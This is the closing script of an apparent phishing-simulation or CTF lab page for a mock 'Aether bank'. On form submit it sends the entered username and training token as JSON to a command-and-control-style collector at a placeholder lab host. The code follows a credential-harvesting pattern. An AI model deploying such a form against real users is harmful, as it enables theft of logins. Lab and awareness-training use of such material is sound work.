document.querySelector('#training').addEventListener('submit', async event => {
  event.preventDefault();
  const form = new FormData(event.target);
  const payload = {
    exercise: 'aether-bank-training',
    username: form.get('username'),
    training_token: form.get('training_token')
  };
  try {
    const response = await fetch('https://c2.ctf-lab.example/ingest', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    });
    if (!response.ok) throw new Error('Collector rejected submission');
    document.querySelector('#status').textContent = 'Exercise submission received.';
  } catch {
    document.querySelector('#status').textContent = 'Exercise collector unavailable.';
  }
});
</script>
</html>
